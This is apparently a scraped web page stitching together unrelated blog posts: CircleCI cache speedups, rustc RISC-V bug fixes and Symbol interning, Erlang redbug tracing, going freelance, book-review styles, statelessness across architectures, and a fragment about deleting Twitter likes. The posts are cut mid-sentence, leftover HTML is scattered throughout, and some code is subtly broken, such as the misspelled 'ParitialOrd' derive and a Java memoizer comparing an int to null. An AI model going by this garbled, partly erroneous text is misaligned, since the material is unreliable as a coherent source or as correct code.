Untar in RAM for rapid cache restores</h3><p>Caching <em>can</em> be a wonderful, run-time-saving thing. That said, accessing our large <code>node_modules</code> folder (nearly 300MB) from the CircleCI cache could sometimes take longer than starting from scratch with a fresh <code>yarn install</code>.</p><p>Internally, CircleCI manages caches and workspaces by putting files into a tarball and uploading that compressed tar file into Amazon S3. When you request a cache, CircleCI downloads the tar file from S3, validates that the file is the one that was requested, and then untars it.</p><p>Because <code>node_modules</code> can have thousands of files, even with lightning-fast network speeds, disk IO can slow down the untar process significantly.</p><p>In our example, restoring our cache took 1:07. Only 6 of those seconds were spent downloading and validating, while decompressing the files took over a minute. In the worst-case scenario, this cache restore step could take up to 3 minutes to complete.</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/6Jtu3bfEugHoXeUokHzzag/d747dd8b395c2fa20910eb5fb2c69538/1i1ZdxE38xmjY57AFoLK9hvEqWZ_fshqhPd6_gCI.png" alt="CircleCI: Untar in RAM."></p></div><p>Lucky for all of us, as of the <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/changelog#ram-disks">April 7th, 2020 CircleCI release</a>, CircleCI supports <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/executor-types/#ram-disks">mounted RAM disks</a> on Docker executors.</p><p>Using these RAM disks has dropped the <code>restore_cache</code> run time down to a consistent 10–20 seconds.

Parallelize jobs for expedited workflows</h3><p>Improved caching and access to caches is all very well and good, but when dependencies change, caches need to be updated. In these cases, the <code>yarn install</code> step will need to do more work, as well as the <code>Saving Cache</code> step, adding an extra minute or so to our pipelines. To solve this problem, we decided to play around with parallelization.</p><p>First, we tried saving the cache in a single job separate from all of our other jobs. Each subsequent job could then restore the cache from its saved location in the workspace instead of saving the cache as part of all of our jobs, including the jest tests:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/Uraphwbv2Qr5ch8w5Dc3g/cc782477babf02e39560d899b75a97c7/Before.svg" alt="CircleCI: before restore cache."></p></div><p>Became</p><div>

It could take almost 2 minutes to store our dependencies in the workspace, and that step needed to complete before we started our jest job.</p><p>To get around this problem, we changed the way we split our jobs. We divided them into first-level jobs that can rely on the global cache for dependencies (and don’t depend on the completion of other jobs) and everything else. Then we added a new first-level job, <code>cache-deps</code>, that cached all dependencies for any job that ran after the first level.</p><p>Our new pipeline runs all first-level jobs immediately, and then anything with a dependency. This division has the added benefit that most of our first-level jobs no longer need to write out to the cache, as <code>cache-deps</code> now takes care of that.</p><p>In our config, this looks like:</p><div><pre><p><span>1</span><span>jobs:</span></p><p><span>2</span><span></span><span>+  cache-deps:</span><span></span></p><p><span>3</span><span></span><span>+    parameters:</span><span></span></p><p><span>4</span><span></span><span>+      key:</span><span></span></p><p><span>5</span><span></span><span>+        type: string</span><span></span></p><p><span>6</span><span></span><span>+    executor: ci-node</span><span></span></p><p><span>7</span><span></span><span>+    steps:</span><span></span></p><p><span>8</span><span></span><span>+      - git-shallow-clone/checkout</span><span></span></p><p><span>9</span><span></span><span>+      - restore_cache:</span><span></span></p><p><span>10</span><span></span><span>+          keys:</span><span></span></p><p><span>11</span><span></span><span>+            - &lt;&lt; parameters.key &gt;&gt;</span><span></span></p><p><span>12</span><span></span><span>+      - run: yarn install</span><span></span></p><p><span>13</span><span></span><span>+      - save_cache:</span><span></span></p><p><span>14</span><span></span><span>+          paths:</span><span></span></p><p><span>15</span><span></span><span>+            - node_modules</span><span></span></p><p><span>16</span><span></span><span>+            - packages/admin-dashboard/node_modules</span><span></span></p><p><span>17</span><span></span><span>+            - packages/core/node_modules</span><span></span></p><p><span>18</span><span></span><span>+            - ...</span><span></span></p><p><span>19</span><span></span><span>+      …</span></p></pre></div></div></article></div>

          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Redbug is safe to be used in production, thanks to a self-protecting
mechanism against overload, which kills the tool in case too many
tracing messages are sent, preventing the Erlang node to become
overloaded. Let’s see it in action:</p><div>
<div>
<pre><code data-lang="erlang"><span>$ </span><span>erl</span>

</div>
</div><p>Let’s now look at the actual message produced by redbug. By default
messages are printed to the standard output, but it’s also possible to
dump them to file:</p><div>
<div>
<pre><code data-lang="erlang"><span>% 15:20:20 &lt;0.31.0&gt;({erlang,apply,2})
</span><span>%</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>])</span></code></pre>
</div>
</div><p>Depending on the version of redbug you are using, you may get a
slightly different message. In this case, the message is split across
two lines. The first line contains a <strong>timestamp</strong>, the <strong>Process Identifier</strong>
(or <em>PID</em>) of the Erlang process which invoked the function and the
<strong>caller</strong> function. The second line contains the function called,
including the input arguments. Both lines are prepended with a <code>%</code>,
which reminds us of the syntax for Erlang comments.</p><p>We can also ask Redbug to produce an extra message for the return
value. This is achieved using the following syntax:</p><div>
<div>
<pre><code data-lang="erlang"><span>4</span><span>&gt;</span> <span>redbug</span><span>:</span><span>start</span><span>(</span><span>"lists:sort/1-&gt;return"</span><span>).</span>
<span>{</span><span>30</span><span>,</span><span>1</span><span>}</span></code></pre>
</div>
</div><p>Let’s invoke the <code>lists:sort/1</code> function again. This time the output
from redbug is slightly different.</p><div>
<div>
<pre><code data-lang="erlang"><span>5</span><span>&gt;</span> <span>lists</span><span>:</span><span>sort</span><span>([</span><span>3</span><span>,</span><span>2</span><span>,</span><span>1</span><span>]).</span>
<span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>]</span>

</span><span>redbug</span> <span>done</span><span>,</span> <span>timeout</span> <span>-</span> <span>1</span></code></pre>
</div>
</div><p>In this case two messages are produced, one when entering the function
and one when leaving the same function.</p><p>When dealing with real code, trace messages can be complex and
therefore hardly readable. Let’s see what happens if we try to trace
the sorting of a list containing 10.000 elements.</p><div>

</div><p>Most of the output has been truncated here, but you should get the
idea. To improve things, we can use a couple of redbug options.  The
option <code>{arity, true}</code> instructs redbug to only display the number of
input arguments for the given function, instead of their actual
value. The <code>{print_return, false}</code> option tells Redbug not to display
the return value of the function call, and to display a <code>…​</code>  symbol,
instead. Let’s see these options in action.</p><div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div v-pre="">
        <p>I've been offline (blog wise) for nearly 3 months now - <a href="https://sarfas.codes/blog/laravel-route-model-binding/">in fact my last post was on April 12th!</a>.</p>
<p>A lot of that has come down to me moving house, COVID-19 messing with my working schedule, and some other things I've been working out in the background. The main thing that's changed here is; <strong>I'm now self-employed</strong></p>

<p>Having taken on some large projects at my main job, I had to cut back on my side-projects and contracting work in the evenings. This was to keep me from burning out as I was working too much.</p>
<p>Fast forward to Coronavirus days, and I found myself missing the contracting work. I loved working from home, and being able to structure the freelance hours around my own schedule. So I decided I was going to take this on full time, and pack in my dayjob.</p>
<p>I left my last PAYE ("normal job") role 3 weeks ago now, and have been working full time on <a href="https://cleveregg.io/">CleverEgg Digital</a> with a close group of clients.</p>

<p>For me, the main positive is controlling my own hours.</p>
<p>If I want to take a day off - I just do it. Yes, I'm not earning money that day, so I need to catch it up; but the option is there if I need it. There's no HR process, no holiday bookings, nothing. I take a day, when I like.</p>
<p>The hours. I'm most efficient after midday. Due to this, most of my contract work is done between the hours of 11am and 7pm. This gives me the freedom to do whatever I like in the mornings, and still have a late night if I like - I don't have to get up for work early ⏰</p>

<p><strong>Time Management</strong></p>
<p>If you're considering doing this, you need to be your own worst critic and be strict on your time. Time is literally money in the contracting world.</p>
<p>You don't have a boss staring down you 24/7. Or checking up on your progress everyday. If you wanna earn some money, do it off your own back.</p>
<p>Once you get a few clients, the thought of invoices being settled will be a good motivator - so that's always a bonus.</p>
<p>I've found that working for yourself means you do need to know a little more than just "your trade". Here's a few I can mention off the top of my head;</p>
<ul>
<li>Basic Accounting,</li>
<li>Fundamentals of understanding Contracts, Terms, and negotiation thereof,</li>
<li>Marketing &amp; pricing</li>
</ul>
<p>I'm a developer by trade, yet I've had to use all of the above 3 in the last 24 hours. Naturally I could pay someone to do all of them; but I'm not in any financial position to do so.</p>

<p>I should have done this sooner! I'm far happier in my work, as well as in a better position with my mental health.</p>
<p>I thought I'd be working longer hours to chase the extra money - given I can do so. However, I actually work less than I did with my "standard job"; and I'm no worse off financially.</p>

<p>Freelance/Contracting isn't for everyone. Clients are very hard to come by, especially in today's economy and situations. I've been extremely lucky in that I've found a handful of clients who are well backed financially, and are unaffected by the pandemic.</p>
<p>I cannot express how much I owe of this to the <a href="https://laravelphp.uk/">LaravelUK</a> community. Both in sourcing/sharing clients, and giving me support and advice for the last 2 years whilst I ponder over this decision.</p>
<p>If you do take the plunge and go into this chaos, here's a few tips;</p>
<ul>
<li>Find a community of like-minded people within your industry</li>
<li>Ensure that you have enough money that you can go without work for a bit
<ul>
<li><em>You won't be getting sick pay, or Annual Leave</em></li>
</ul></li>
<li>Don't under charge. Cheaper clients are cheap for a reason. Those that want your time, respect your trade, and want to look after you will pay for it.</li>
<li>Be confident in your work; but not complacent / arrogant</li>
<li><strong>Enjoy it. Being your own boss is awesome!</strong></li>
</ul>    </div></div>]]>

</blockquote>

<p>With the coronavirus shortening my work commute into a walk down the hall, I’ve been able to read more in the mornings. Now that I’ve been gifted more time in the day, I am finishing about a book a week (I’m privileged to have at least an hour a day for reading, and that time quickly adds up). It has been amazing to return to my teenage reading habits when my parents feigned exasperation at my perpetual nose-in-book lifestyle - “is that kid reading again?”. In these tumultuous times, books have also been a welcome respite (well-documented positive effects of reading on mental well-being probably don’t hurt).</p>

<p>Reading more, I couldn’t help but notice book reviews everywhere. Inspired, I wrote <a href="https://www.micahlerner.com/books/2020-05-30-solaris.html">a</a> <a href="https://www.micahlerner.com/books/2020-05-21-the-man-who-solved-the-market-how-jim-simons-launched-the-quant-revolution.html">few</a>, but found myself asking what I wanted to get out of the creative energy I was channeling into them (after all, I’m not a professional book-review-writer and my time is limited). In order to think clearly about the topic, I sought inspiration in the work of other writers.</p>

<h2 id="how-do-other-writers-approach-book-reviews">How do other writers approach book reviews?</h2>

<p>With the question “how should I write about what I’ve been reading?” in mind, I started compiling examples of book reviews and categorizing them by style:</p>

<ul>
  <li><strong>Persuasive reviews</strong>: I bucket reviews <a href="https://www.nytimes.com/2019/09/16/books/review-night-boat-tangier-kevin-barry.html">like those</a> from the NYTimes into this category. Even though the author of the inevitably informs you about the book’s content, they’re advocating that their readers purchase the book (or don’t purchase the book in some case). Frequently the review also gives a background on the book’s literary lineage.</li>
  <li><strong>Summary reviews</strong>: Products like <a href="https://www.blinkist.com/en/nc/library/">Blinkist</a> or <a href="https://www.nateliason.com/notes/antifragile">Nat Eliason’s book reviews</a> fall into this category. I think there’s a place for summarization-style reviews of non-fiction <a href="https://commoncog.com/blog/the-3-kinds-of-non-fiction-book/#branchbooks">“branch books”</a> - if one were to imagine knowledge as a tree, “branch books” typically cover a single topic on the edge of the tree, rather than attempting to be a wide-reaching, foundational tome of a subject area.</li>
  <li><strong>Thematic reviews</strong>: The New York Review of Books <a href="https://www.nybooks.com/articles/2020/07/02/what-is-college-worth/">often</a> <a href="https://www.nybooks.com/articles/2019/11/07/heritage-of-evil/">combines</a> discussion of several books into a general overview of a topic. This approach is well-suited to academics or subject-matter experts who have the time (and intellectual stamina!) to read a variety of books connected to a common thread.</li>
  <li><strong>Deep-dive reviews:</strong> Slate Star Codex was (while I was writing this, the takedown of the blog happened) an <a href="https://slatestarcodex.com/2020/03/17/book-review-hoover/">example</a> of this category, with <a href="https://slatestarcodex.com/2020/06/01/book-review-origin-of-consciousness-in-the-breakdown-of-the-bicameral-mind/">opinionated book reviews</a> that form connections between the author’s well-formed thoughts and the subject matter at hand. They’re often witty and summarize the content as needed while weaving it into a story.</li>
</ul>

<p>With a general overview of possible styles loaded into my memory, I switched to thinking about what I was hoping to get out of the process.</p>

<h2 id="what-do-i-want-to-get-out-of-book-reviews">What do I want to get out of book reviews?</h2>

<p>After consuming diverse, different review styles, I realized that I could reduce my motivation for reviewing books to two goals: retention of what I learned (in the case of non-fiction) books and writing something other people enjoy reading.</p>

<p>Thankfully there is a large body of knowledge about how to accomplish the first goal using <a href="https://www.gwern.net/Spaced-repetition">spaced repetition</a>.</p>

<p>Spaced repetition is also called SRS, and there are many sources about how to use the system to increase retention:</p>
<ul>
  <li><a href="https://robertheaton.com/">Rob Heaton’s</a> blog post on <a href="https://robertheaton.com/2018/06/25/how-to-read/">How to read</a></li>
  <li><a href="http://augmentingcognition.com/ltm.html">Augmenting long term memory</a> discusses using Anki for deep reviews</li>
  <li>A (sic) Hahvahd Business Review <a href="https://hbr.org/2016/02/how-to-read-a-book-a-week">article</a> about retention and understanding</li>
</ul>

<p>Unfortunately, making book reviews enjoyable for other people is a more difficult problem, and the best path is being inspired by others. If you find a great review <a href="https://www.micahlerner.com/2020/06/13/micah.lerner@hey.com">send it my way</a>!</p>

While statelessness has a lot of benefits, it’s unfortunately rarely possible in the real world. In this post, I’d like to detail this stance of mine a bit.</p> <div> <h2 id="state-in-functional-programming">State in Functional Programming</h2> <div> <p>Functional Programming is based on a set of principles. Among those principles are <em>pure</em> functions:</p> <div> <blockquote> <p>A pure function is a function that has the following properties:</p> <ol><li><span>Its return value is the same for the same arguments</span></li><li><span>Its evaluation has no side effects</span></li></ol> </blockquote>  </div> <p>For example, the following function is <em>pure</em>:</p> <div> <div> <pre><code data-lang="java"><span>int</span> <span>timesTwo</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>2</span><span>;</span>
<span>}</span></code></pre> </div> </div> <p>A <em>pure</em> function allows <em>referential transparency</em>: the swapping of then function with its return value. With that in mind, the introduction of state may defeat the previous definition. For example, the following breaks <em>referential transparency</em>:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>Multiplier</span> <span>{</span>

  <span>private</span> <span>int</span> <span>factor</span> <span>=</span> <span>1</span><span>;</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>return</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>void</span> <span>setFactor</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>Successive calls to <code>times()</code> with the same argument may return different results because the <code>setFactor()</code> method may have changed the <code>factor</code> attribute’s value between calls. Interestingly enough, a method can conform to the <em>referential transparency</em> property, but still break the no side-effects property. Here’s an example:</p> <div> <div> <pre><code data-lang="java"><span>class</span> <span>MemoizedMultiplier</span> <span>{</span>

  <span>private</span> <span>final</span> <span>int</span> <span>factor</span><span>;</span>
  <span>private</span> <span>final</span> <span>Map</span><span>&lt;</span><span>Integer</span><span>,</span> <span>Integer</span><span>&gt;</span> <span>results</span> <span>=</span> <span>new</span> <span>HashMap</span><span>&lt;&gt;();</span>

  <span>public</span> <span>MemoizedMultiplier</span><span>(</span><span>int</span> <span>factor</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>factor</span> <span>=</span> <span>factor</span><span>;</span>
  <span>}</span>

  <span>public</span> <span>int</span> <span>times</span><span>(</span><span>int</span> <span>value</span><span>)</span> <span>{</span>
    <span>int</span> <span>cache</span> <span>=</span> <span>results</span><span>.</span><span>get</span><span>(</span><span>value</span><span>);</span>
    <span>if</span> <span>(</span><span>cache</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>int</span> <span>result</span> <span>=</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
      <span>results</span><span>.</span><span>put</span><span>(</span><span>value</span><span>,</span> <span>result</span><span>);</span>
      <span>return</span> <span>result</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>cache</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>The above implementation is <em>immutable</em>: state is set once when the object is created, and cannot be changed afterwards. Successive calls with the same argument will return the same result over and over. Yet, the method has side-effects.</p> <p>To keep most of the system <em>pure</em>, practitioners of <abbr title="Functional Programming">FP</abbr> push non-pure functions to the system boundaries.</p> </div> </div> <div> <h2 id="state-in-web-architectures">State in web architectures</h2> <div> <p>The HTTP protocol is stateless. The benefit is obvious: when a request hits the load-balancer, the latter can forward it to any web server that belongs to the cluster, and that hosts the requested resource. This allows for <a href="https://en.wikipedia.org/wiki/Scalability#Horizontal_or_Scale_Out" target="_blank" rel="noopener">horizontal scaling</a>. When the load increases, it’s straightforward to add more nodes until the performance becomes acceptable again. It works like a charm, until the requirement goes beyond just displaying static pages.</p> <p>In reality, a lot of use-cases require different HTTP requests to be recognized as originating from the same "session": authentication, e-commerce caddies, etc. <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank" rel="noopener">Cookies</a> are the browsers' answer to those requirements.</p> <p>Servers do offer a generic storage mechanism, keyed to a session identifier. On the first request, the server adds a cookie with a specific session id to the response. Subsequent requests will use this cookie, so the server associates the request with the same session. Different servers have different cookies: <code>JSESSIONID</code> for Java EE, <code>PHPSESSID</code> for PHP, <code>ASPSESSIONID</code> for ASP, etc.</p> <p>Data stored on a specific cluster node won’t obviously be accessible to requests forwarded to other nodes, even when they originate from the same session. To avoid that, sessions needs to be "pinned down" on the node that received the first request for that session. In standard web architectures, this is one of the responsibility of the load-balancer: it keeps the association between a session id and the node in memory. This feature is known as <em>sticky sessions</em>.</p> <p>However, nodes will sometimes fail. If session data is on that node, it will be lost. To compensate for that, data needs to be replicated on other nodes. That capability is known as <em>session replication</em>.</p> <p>Sticky sessions, and even more so sessions replication, make architectures stateful.</p> </div> </div> <div> <h2 id="state-in-rest-architectures">State in REST architectures</h2> <div>  <ol><li><span>Client-server architecture</span></li><li><span>Statelessness</span></li><li><span>Cacheability</span></li><li><span>Layered system</span></li><li><span>Uniform interface</span></li></ol> <p>Note that #2 explicitly defines <a href="https://en.wikipedia.org/wiki/Representational_state_transfer#Statelessness" target="_blank" rel="noopener">statelessness</a> as a requirement of the REST architecture. However, the definition of it in this context is not the absence of state, but that state shouldn’t be stored server-side.</p> <div> <blockquote> <p>The client-server communication is constrained by no client context being stored on the server between requests. Each request from any client contains all the information necessary to service the request, and the session state is held in the client. The session state can be transferred by the server to another service such as a database to maintain a persistent state for a period and allow authentication.</p> </blockquote> </div> <p>The quote above defines two options to store data:</p> <div> <dl> <dt>In a database</dt> <dd> <p>Storing data is the <em>raison d’être</em> for databases, whether SQL or NoSQL. Hence, it seems like an obvious choice to store state. However, this generally implies <em>disk-based persistence</em>. In turn, this means increased access time to data, 2 or 3 orders of magnitude higher than for in-memory access.</p> </dd> <dt>On the client</dt> <dd> <p>Another option is to store data as cookies. This approach raises some interesting challenges on its own: the first one is about security. If credentials-related data is stored client-side, then how can the server guarantees they are genuine? The currently agreed-upon answer is <a href="https://jwt.io/" target="_blank" rel="noopener">JSON Web Tokens</a>. One just needs to remember it makes the flow more complex, and slower, because validation still needs to occur server-side, prior to any further request handling.</p> <p>The second challenge revolves around data serialization. Simple types <em>e.g.</em> <code>int</code> or <code>String</code> can easily be set in cookie values, but what about more complex types? It would require an serialization/deserialization mechanism: when the request is received, cookies should be deserialized into objects, and when the response is sent, objects should be serialized back into a compatible format <em>e.g.</em> JSON.</p> <p>The complete setup is worth a dedicated post, but here are some points that deserve some attention:</p> <ul><li><span>How to manage serialization limitations?</span></li><li><span>The need to automate the serialization/deserialization flow</span></li><li><span>Configure the entities to be serialized, and decide which JSON library to use</span></li></ul> </dd> </dl> </div> </div> </div> <div> <h2 id="state-in-kubernetes">State in Kubernetes</h2> <div> <p>First, one should remember that Kubernetes was originally focused on stateless workloads. For example, <code>StatefulSet</code> was introduced in version 1.5 as a beta feature. Furthermore, rolling upgrades of the <code>Deployment</code> object handle pods only. If containerized applications use a database, and software require different schema versions, you’re on your own: while possible, <a href="https://www.youtube.com/watch?v=RvCnrBZ0DPY" target="_blank" rel="noopener">it’s not trivial</a>.</p> <p>Apart from that, Kubernetes offers some interesting options to manage state:</p> <div> <dl> <dt>Inside the container</dt> <dd> <p>The easiest way to store data is to use the container’s topmost layer. This is the case when one uses one of the filesystem unmapped directories <em>e.g.</em> <code>/var/log</code>. This option has a big flaw: when the container is stopped, whether abnormally or not, data is lost.</p> </dd> <dt>In an attached volume</dt> <dd> <p><a href="https://kubernetes.io/docs/concepts/storage/volumes/" target="_blank" rel="noopener">Volumes</a> are the nominal way to store data across pod stops.

<p>A while ago I decided to delete my ‘like’ history on Twitter.</p>



<p>Since then, I’ve discovered interesting ways in which Twitter’s engineering makes it impossible to do.</p>



